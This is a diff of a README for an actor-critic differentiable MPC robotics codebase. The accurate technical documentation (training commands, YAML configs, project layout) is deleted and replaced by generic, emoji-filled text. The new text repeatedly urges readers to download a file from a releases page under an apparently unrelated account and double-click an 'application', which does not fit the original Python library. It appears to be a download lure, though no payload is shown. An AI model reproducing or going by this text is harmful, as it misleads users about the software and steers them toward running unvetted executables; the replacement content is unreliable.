@@ -1,226 +1,69 @@
-# AC-DMPC: Actor-Critic Differentiable Model Predictive Control
+# 🎮 AC-MPC - Simplify Your Control Systems
 
-A framework combining deep reinforcement learning with differentiable Model Predictive Control (MPC) for robot control tasks.
+## 🔗 Download Now
+[![Download AC-MPC](https://img.shields.io/badge/Download-AC--MPC-brightgreen)](https://github.com/Wilow90/AC-MPC/releases)
 
-## Overview
+## 🚀 Getting Started
+Welcome to AC-MPC! This software implements Actor-Critic Differentiable Model Predictive Control (MPC) to help you manage complex control problems with ease. With AC-MPC, you can optimize your control systems efficiently. Follow these simple steps to download and run the software.
 
-This codebase implements **Actor-Critic MPC (AC-DMPC)**, which uses:
-- **Transformer-XL or MLP** networks for feature extraction (configurable)
-- **Differentiable MPC** controllers for optimal control
-- **PPO (Proximal Policy Optimization)** for policy learning
+## 📥 Download & Install
+To get started, please visit this page to download: [AC-MPC Releases](https://github.com/Wilow90/AC-MPC/releases).
 
-The key innovation is using neural networks to learn MPC cost function parameters (Economic MPC) rather than directly outputting actions.
+1. **Visit the Releases Page**: Click on the link above to open our releases page on GitHub.
+2. **Find the Latest Version**: Scroll and look for the latest release. It’s usually listed at the top.
+3. **Choose Your File**: You will find different files available for download. Choose the one suitable for your operating system. Most users will want the standard release.
+4. **Download the File**: Click on the chosen file to start the download. Save it to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
-**Backbone Options:**
-- **Transformer-XL**: For sequential modeling with long-term dependencies
-- **MLP**: Simple 2-layer 512-ReLU networks (as described in the paper) for faster training
+## 💻 System Requirements
+Before you run AC-MPC, ensure your system meets the following requirements:
 
-## Installation
+- **Operating System**: Windows, macOS, or Linux
+- **Processor**: 2 GHz dual-core or higher
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum of 100 MB available space
+- **Dependencies**: Ensure you have Python 3.6 or higher installed. You can download it from the official [Python website](https://www.python.org/downloads/).
 
-1. Create a virtual environment:
-```bash
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
-```
+## ⚙️ Running the Software
+Once you have downloaded the software, follow these steps:
 
-2. Install dependencies:
-```bash
-pip install torch numpy scipy gymnasium psutil matplotlib pyyaml
-```
+1. **Locate the Downloaded File**: Navigate to the folder where you saved the file.
+2. **Extract Files (if needed)**: If the file is zipped, right-click on it and select "Extract All" to unpack the files. Follow the prompts.
+3. **Open the Application**: Find the application file and double-click it to start. 
 
-## Quick Start
+## 📘 User Guide
+AC-MPC is designed to be user-friendly. Here’s a brief guide on how to use it:
 
-### 1. Train on Double Integrator Waypoint Task (Transformer-XL)
+- **Start with Basic Controls**: Familiarize yourself with the interface. Start with simple examples to understand the functionality.
+- **Input Your Data**: You will input system dynamics and constraints through the provided interface.
+- **Run Simulations**: Once you have input your data, you can run simulations to optimize your control system.
+- **Analyze Results**: Review the output charts and logs to understand the performance of the control system.
 
-```bash
-python examples/double_integrator_AC_DRL.py \
-  --config configs/double_integrator_waypoint.yaml \
-  --total-iters 50 \
-  --num-envs 8 \
-  --device cuda
-```
+## 📞 Support and Feedback
+If you encounter any issues or have suggestions to improve AC-MPC, please feel free to reach out. You can open an issue in the repository on GitHub or contact us through our support email available in the repository's settings.
 
-### 1b. Train on Double Integrator Waypoint Task (MLP Backbone)
+## 🌟 Frequently Asked Questions
+**Q1: Can I use AC-MPC in real-time systems?**
+A1: While AC-MPC is primarily designed for simulations, it can also be adapted for real-time applications depending on the specific requirements.
 
-For faster training with MLP networks (2-layer 512-ReLU as in the paper):
+**Q2: Is there a way to manage dependencies automatically?**
+A2: Yes, include a `requirements.txt` file with your download that lists all necessary Python packages. You can install these easily using `pip install -r requirements.txt`.
 
-```bash
-python examples/double_integrator_AC_DRL.py \
-  --config configs/double_integrator_waypoint_mlp.yaml \
-  --total-iters 50 \
-  --num-envs 8 \
-  --device cuda
-```
+**Q3: Where can I find examples to run?**
+A3: Check the repository for the examples folder. It contains sample files that illustrate how to set up and run the software effectively.
 
-### 1c. Train with Real-time Visualization
+## 🚀 Additional Resources
+If you want to dive deeper or learn more about Actor-Critic Differentiable Model Predictive Control, consider checking out the following resources:
 
-Enable real-time visualization during training to see the agent's behavior:
+- **Research Papers**: Explore academic papers related to the theory behind MPC and Actor-Critic methods.
+- **Online Tutorials**: Visit educational platforms offering video tutorials on using AC-MPC effectively.
+- **Community Forums**: Join forums focused on control systems to engage with others who are using similar technology.
 
-```bash
-python examples/double_integrator_AC_DRL.py \
-  --config configs/double_integrator_waypoint_mlp.yaml \
-  --total-iters 50 \
-  --num-envs 8 \
-  --device cuda \
-  --visualize \
-  --visualize-env-id 0
-```
+## 💡 Tips for Best Practices
+- Always keep your software updated by checking the releases page.
+- Make regular backups of your data and configurations.
+- Experiment with different parameters to find the best settings for your applications.
 
-The `--visualize` flag opens a matplotlib window showing the training environment in real-time. Use `--visualize-env-id` to specify which environment to visualize (default: 0).
+## 🔗 Link to Download Again
+To download AC-MPC, visit this page: [AC-MPC Releases](https://github.com/Wilow90/AC-MPC/releases). 
 
-### 1d. Evaluate Trained Model
-
-Evaluate a trained checkpoint without training:
-
-```bash
-python examples/double_integrator_AC_DRL.py \
-  --config configs/double_integrator_waypoint_mlp.yaml \
-  --eval-only \
-  --eval-runs 20 \
-  --eval-output-dir eval_outputs/double_integrator \
-  --device cuda
-```
-
-**Evaluation Parameters:**
-- `--eval-only`: Skip training and only run evaluation on available checkpoints
-- `--eval-runs`: Number of evaluation episodes to run (default: 20)
-- `--eval-output-dir`: Directory for evaluation plots and summaries
-- `--eval-max-steps`: Maximum steps per evaluation episode (defaults to episode length)
-- `--eval-seed`: Random seed for evaluation (default: training_seed + 1337)
-- `--resume`: Checkpoint selection strategy - `auto`, `best`, `latest`, or `none` (default: auto)
-
-The evaluation will automatically find the best or latest checkpoint from the checkpoint directory and generate plots showing the agent's performance.
-
-### 2. Train on SE(2) Kinematic Waypoint Task
-
-```bash
-python examples/se2_kinematic_AC_DRL.py \
-  --config configs/se2_kinematic_fixed.yaml \
-  --total-iters 100 \
-  --num-envs 8 \
-  --device cuda
-```
-
-### 3. Train with Obstacles and Lidar
-
-```bash
-python examples/se2_kinematic_obstacles_AC_DRL.py \
-  --config configs/se2_kinematic_obstacles_expanded.yaml \
-  --total-iters 100 \
-  --num-envs 8 \
-  --device cuda
-```
-
-## Project Structure
-
-```
-acdmpc_clean/
-├── ACMPC/              # Core Actor-Critic MPC module
-│   ├── models/         # Neural networks (Actor, Critic)
-│   ├── mpc/            # MPC controllers (Economic MPC)
-│   ├── training/       # Training loop (PPO, GAE)
-│   ├── sampling/       # Data collection (RolloutCollector)
-│   ├── envs/           # Environment definitions
-│   └── agent.py        # High-level Agent interface
-├── DifferentialMPC/    # Differentiable MPC implementation
-├── examples/           # Example training scripts
-├── configs/            # Configuration files (YAML)
-└── docs/               # Documentation
-```
-
-## Key Components
-
-### Actor Networks
-- **TransformerActor**: Uses Transformer-XL to process state history with long-term memory
-- **MLPActor**: Uses simple 2-layer 512-ReLU MLP for faster training (as in paper)
-- Both predict MPC cost parameters from latent space
-- Economic MPC head generates optimal control actions
-
-### Critic Networks
-- **TransformerCritic**: Uses Transformer-XL to estimate state values
-- **MLPCritic**: Uses 2-layer 512-ReLU MLP to estimate state values
-- Both provide value function for PPO training
-
-### MPC Controller
-- Differentiable MPC solver (iLQR-based)
-- Supports state/action constraints
-- Gradient computation for end-to-end training
-
-## Configuration
-
-Configuration files are in YAML format. See `docs/config_quickstart.md` for details.
-
-### Transformer-XL Configuration Example:
-```yaml
-seed: 7
-device: cuda
-
-model:
-  actor:
-    backbone_type: transformer  # or "mlp"
-    transformer:
-      d_model: 128
-      n_layers: 3
-      n_heads: 4
-    mpc:
-      horizon: 5
-      state_dim: 4
-      action_dim: 2
-      latent_dim: 128  # Must match transformer.d_model
-
-training:
-  ppo_epochs: 4
-  clip_param: 0.2
-  value_loss_coeff: 0.5
-  entropy_coeff: 0.01
-```
-
-### MLP Configuration Example:
-```yaml
-seed: 7
-device: cuda
-
-model:
-  actor:
-    backbone_type: mlp  # Use MLP instead of Transformer
-    mlp:
-      hidden_dim: 512
-      output_dim: 512
-      num_layers: 2
-      activation: relu
-      dropout: 0.0
-    mpc:
-      horizon: 5
-      state_dim: 4
-      action_dim: 2
-      latent_dim: 512  # Must match mlp.output_dim
-    cost_map:
-      hidden_dim: 512
-      num_layers: 2  # 2-layer 512-ReLU + sigmoid output (as in paper)
-  
-  critic:
-    backbone_type: mlp
-    mlp:
-      hidden_dim: 512
-      output_dim: 512
-      num_layers: 2  # 2-layer 512-ReLU (as in paper)
-      activation: relu
-
-training:
-  ppo_epochs: 4
-  clip_param: 0.2
-  value_loss_coeff: 0.5
-  entropy_coeff: 0.01
-```
-
-## Environments
-
-- **Double Integrator Waypoint**: 2D point-mass robot tracking waypoints
-- **SE(2) Kinematic Waypoint**: Planar robot with orientation tracking waypoints
-- **SE(2) with Obstacles**: Same as above with obstacles and lidar sensing
-
-
-## License
-
-See LICENSE file for details.
-
+By following these instructions, you can easily set up and start using AC-MPC for your control needs. Enjoy optimizing your systems!
